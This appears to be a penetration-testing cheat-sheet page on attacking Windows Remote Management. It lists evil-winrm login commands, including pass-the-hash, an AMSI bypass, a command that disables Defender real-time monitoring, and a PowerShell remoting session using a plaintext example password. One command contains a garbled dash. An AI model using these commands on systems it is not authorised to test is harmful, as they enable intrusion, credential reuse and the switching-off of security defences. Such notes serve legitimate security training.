---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WinRM (5985,5986)

## Authentication

{% tabs %}
{% tab title="Password-based" %}
```bash
evil-winrm -i <ip> -u <user> -p <pass>
```
{% endtab %}

{% tab title="Pass-the-Hash" %}
```bash
evil-winrm -i <ip> -u <user> -H <hash>
```
{% endtab %}

{% tab title="Certificate & Key" %}
```bash
# -S -> SSL
evil-winrm -i 10.10.11.152 -S -k <key> -c <crt>
```
{% endtab %}
{% endtabs %}

## AMSI Bypass

{% tabs %}
{% tab title="1. Check" %}
{% code overflow="wrap" %}
```powershell
> #amsiscanbuffer
At line:1 char:1
+ #amsiscanbuffer
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.

# Try this as well
> set-mppreference â€”disablerealtimemonitoring $true
```
{% endcode %}
{% endtab %}

{% tab title="2. Bypass" %}
```powershell
> Bypass-4MSI

Info: Patching 4MSI, please be patient...
[+] Success!
```
{% endtab %}

{% tab title="3. Confirm" %}
```powershell
> #amsiscanbuffer
```
{% endtab %}
{% endtabs %}

## PowerShell Remoting

**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession`. Therefore, a user needs to be in the local group `Remote Management Users` to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.

> _Creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior. Opt for `evil-winrm` instead._

{% code overflow="wrap" %}
```powershell
> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```
{% endcode %}
